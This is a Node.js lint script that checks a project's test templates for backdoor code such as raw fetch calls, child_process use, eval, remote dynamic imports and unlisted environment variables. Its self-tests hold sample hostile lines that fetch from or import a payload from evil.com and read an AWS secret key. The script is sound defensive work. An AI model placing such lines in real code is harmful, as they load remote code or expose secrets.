// Copyright (c) 2026 TestNUX Contributors
// SPDX-License-Identifier: Apache-2.0

/**
 * scripts/lint-templates.mjs
 *
 * Security lint for files in templates/.
 *
 * Threat model: a malicious PR could modify templates/spec.ts to introduce
 * outbound HTTP calls, child_process spawning, eval(), or dynamic remote imports.
 * Such code would ship in every user's scaffolded test pass and act as a backdoor.
 *
 * This script is intentionally dependency-free (Node built-ins only).
 *
 * Usage:
 *   node scripts/lint-templates.mjs
 *
 * Exit codes:
 *   0  all templates pass — no forbidden patterns found
 *   1  one or more violations found — details printed to stderr
 *
 * Forbidden patterns (regex-based):
 *   - fetch( outside of page.request / request.get context
 *   - child_process import or require
 *   - eval( or Function(
 *   - import('http:// or import('https:// (dynamic remote imports)
 *   - process.env.<VAR> for variables outside the documented allowlist
 *
 * Documented process.env allowlist:
 *   SITE_GATE_PIN, SITE_GATE_SECRET, BASE_URL
 *
 * Self-test:
 *   The script also runs an internal self-test to verify that the regex
 *   patterns would correctly flag hypothetical malicious code snippets.
 *   Self-test failures are fatal — they indicate a broken lint rule.
 */

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);

// ── Configuration ────────────────────────────────────────────────────────────

const TEMPLATES_DIR = path.join(__dirname, '..', 'templates');

/**
 * Allowed process.env variable names (exact match after `process.env.`).
 * Any other process.env.<VAR> access is flagged.
 */
const ALLOWED_ENV_VARS = new Set(['SITE_GATE_PIN', 'SITE_GATE_SECRET', 'BASE_URL']);

/**
 * Forbidden patterns.
 * Each entry: { id, description, regex, selfTestMatch, selfTestNoMatch }
 *
 * selfTestMatch   — string that MUST match (to verify the regex is working)
 * selfTestNoMatch — string that must NOT match (to verify no false positives)
 */
const FORBIDDEN_PATTERNS = [
  {
    id:          'NO_BARE_FETCH',
    description: 'Raw fetch() call (use page.request or request.get instead)',
    // Matches `fetch(` that is NOT preceded by `.request.` or `request.`
    // Uses a negative lookbehind for the allowed prefixes.
    regex:       /(?<!(?:page\.request|request)\.(?:get|post|put|delete|patch|fetch)\s*\n?\s*\()fetch\s*\(/g,
    // Simpler pattern for line-level detection (applied per line):
    lineRegex:   /(?<!\.\s*)fetch\s*\(/,
    // Lines containing these safe prefixes are excluded from the bare-fetch check
    fetchAllowList: ['page.request', 'request.get', 'request.post', 'request.put',
                     'request.delete', 'request.patch', 'request.fetch'],
    selfTestMatch:   "const res = fetch('https://evil.com');",
    selfTestNoMatch: "const res = await page.request.get('/api/data');",
  },
  {
    id:          'NO_CHILD_PROCESS',
    description: 'child_process import or require (forbidden — enables arbitrary code execution)',
    lineRegex:   /child_process/,
    selfTestMatch:   "import { exec } from 'child_process';",
    selfTestNoMatch: "// Note: child processes are not used here",
  },
  {
    id:          'NO_EVAL',
    description: 'eval() or Function() constructor (forbidden — enables arbitrary code execution)',
    lineRegex:   /\beval\s*\(|\bnew\s+Function\s*\(/,
    selfTestMatch:   "eval('console.log(42)')",
    selfTestNoMatch: "// evaluation of conditions is done via expect()",
  },
  {
    id:          'NO_DYNAMIC_REMOTE_IMPORT',
    description: "Dynamic import of remote URL (import('http://...') or import('https://'))",
    lineRegex:   /import\s*\(\s*['"`]https?:\/\//,
    selfTestMatch:   "const mod = await import('https://evil.com/payload.js');",
    selfTestNoMatch: "const mod = await import('./local-helper.js');",
  },
];

// ── Self-test ─────────────────────────────────────────────────────────────────

/**
 * Verifies that each forbidden pattern correctly matches its selfTestMatch string
 * and does NOT match its selfTestNoMatch string.
 * Exits 1 if any self-test fails (broken lint rule).
 */
function runSelfTests() {
  let selfTestPassed = true;

  for (const pattern of FORBIDDEN_PATTERNS) {
    const re = new RegExp(pattern.lineRegex.source, 'i');

    // Must match the bad example
    if (!re.test(pattern.selfTestMatch)) {
      process.stderr.write(
        `[lint-templates] SELF-TEST FAIL: pattern ${pattern.id} did NOT match its selfTestMatch.\n` +
        `  Pattern     : ${pattern.lineRegex}\n` +
        `  selfTestMatch: ${pattern.selfTestMatch}\n`,
      );
      selfTestPassed = false;
    }

    // Must NOT match the safe example — only skip this check for fetch (complex allowlist)
    if (pattern.id !== 'NO_BARE_FETCH' && re.test(pattern.selfTestNoMatch)) {
      process.stderr.write(
        `[lint-templates] SELF-TEST FAIL: pattern ${pattern.id} incorrectly matched its selfTestNoMatch.\n` +
        `  Pattern       : ${pattern.lineRegex}\n` +
        `  selfTestNoMatch: ${pattern.selfTestNoMatch}\n`,
      );
      selfTestPassed = false;
    }
  }

  // Self-test for process.env allowlist
  const envRe = /process\.env\.([A-Z0-9_]+)/gi;
  const badEnvLine   = "const secret = process.env.AWS_SECRET_KEY;";
  const goodEnvLine  = "const pin = process.env.SITE_GATE_PIN;";

  const badMatch = badEnvLine.match(envRe);
  if (!badMatch || ALLOWED_ENV_VARS.has(badMatch[0].replace('process.env.', ''))) {
    // This should flag AWS_SECRET_KEY since it is NOT in allowlist
    // (we just verify the regex matches — the allowlist check is done in lintFile)
    if (!badMatch) {
      process.stderr.write(
        `[lint-templates] SELF-TEST FAIL: process.env regex did NOT match "${badEnvLine}"\n`,
      );
      selfTestPassed = false;
    }
  }

  const goodMatch = goodEnvLine.match(envRe);
  if (!goodMatch) {
    process.stderr.write(
      `[lint-templates] SELF-TEST FAIL: process.env regex did NOT match "${goodEnvLine}"\n`,
    );
    selfTestPassed = false;
  }

  if (!selfTestPassed) {
    process.stderr.write('[lint-templates] Aborting — fix broken lint rules before running.\n');
    process.exit(1);
  }

  console.log('[lint-templates] Self-tests passed — all regex patterns are operational.');
}

// ── File linter ───────────────────────────────────────────────────────────────

/**
 * Lints a single file for forbidden patterns.
 * @param {string} filePath  Absolute path to the file
 * @returns {{ violations: Array<{line: number, col: number, id: string, description: string, text: string}> }}
 */
function lintFile(filePath) {
  const src = fs.readFileSync(filePath, 'utf-8');
  const lines = src.split('\n');
  const violations = [];

  for (let lineIdx = 0; lineIdx < lines.length; lineIdx++) {
    const line = lines[lineIdx];
    const lineNum = lineIdx + 1;

    // Skip comment-only lines (single-line // comments)
    const trimmed = line.trimStart();
    if (trimmed.startsWith('//')) continue;

    for (const pattern of FORBIDDEN_PATTERNS) {
      const re = new RegExp(pattern.lineRegex.source, 'i');

      if (pattern.id === 'NO_BARE_FETCH') {
        // Only flag if none of the allowed fetch prefixes appear on the same line
        if (re.test(line)) {
          const isAllowed = (pattern.fetchAllowList ?? []).some((prefix) => line.includes(prefix));
          if (!isAllowed) {
            const col = line.search(re) + 1;
            violations.push({ line: lineNum, col, id: pattern.id, description: pattern.description, text: line.trim() });
          }
        }
      } else {
        if (re.test(line)) {
          const col = line.search(re) + 1;
          violations.push({ line: lineNum, col, id: pattern.id, description: pattern.description, text: line.trim() });
        }
      }
    }

    // Check process.env.<VAR> against the allowlist
    const envRe = /process\.env\.([A-Z0-9_]+)/gi;
    let m;
    while ((m = envRe.exec(line)) !== null) {
      const varName = m[1];
      if (!ALLOWED_ENV_VARS.has(varName)) {
        violations.push({
          line:        lineNum,
          col:         m.index + 1,
          id:          'NO_UNLISTED_ENV',
          description: `process.env.${varName} is not in the allowed ENV var list (${[...ALLOWED_ENV_VARS].join(', ')})`,
          text:        line.trim(),
        });
      }
    }
  }

  return { violations };
}

// ── Main ──────────────────────────────────────────────────────────────────────

function main() {
  // Run self-tests first to confirm regex patterns are healthy
  runSelfTests();

  // Collect template files
  const templateFiles = collectFiles(TEMPLATES_DIR);

  if (templateFiles.length === 0) {
    console.log(`[lint-templates] No template files found in ${TEMPLATES_DIR}. Nothing to lint.`);
    process.exit(0);
  }

  console.log(`[lint-templates] Linting ${templateFiles.length} file(s) in templates/...`);

  let totalViolations = 0;

  for (const filePath of templateFiles) {
    const rel = path.relative(path.join(__dirname, '..'), filePath).replace(/\\/g, '/');
    const { violations } = lintFile(filePath);

    if (violations.length === 0) {
      console.log(`  PASS  ${rel}`);
    } else {
      console.error(`  FAIL  ${rel} — ${violations.length} violation(s):`);
      for (const v of violations) {
        process.stderr.write(
          `        [${v.id}] line ${v.line}:${v.col} — ${v.description}\n` +
          `          > ${v.text}\n`,
        );
      }
      totalViolations += violations.length;
    }
  }

  if (totalViolations > 0) {
    process.stderr.write(
      `\n[lint-templates] FAILED — ${totalViolations} violation(s) found across template files.\n` +
      '  A malicious PR may have introduced forbidden patterns. Review the diff carefully.\n',
    );
    process.exit(1);
  } else {
    console.log('\n[lint-templates] All template files are clean.');
    process.exit(0);
  }
}

/**
 * Recursively collects all files from a directory.
 * Skips node_modules, .git, and binary files.
 * @param {string} dir
 * @returns {string[]}
 */
function collectFiles(dir) {
  const results = [];
  if (!fs.existsSync(dir)) return results;

  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    if (entry.name.startsWith('.') || entry.name === 'node_modules') continue;
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      results.push(...collectFiles(full));
    } else if (entry.isFile()) {
      // Only lint text-based files (skip .png, .jpg, etc.)
      const ext = path.extname(entry.name).toLowerCase();
      const TEXT_EXTS = new Set(['.ts', '.tsx', '.js', '.mjs', '.cjs', '.md', '.json', '.jsonl', '.yaml', '.yml']);
      if (TEXT_EXTS.has(ext) || ext === '') {
        results.push(full);
      }
    }
  }
  return results;
}

main();
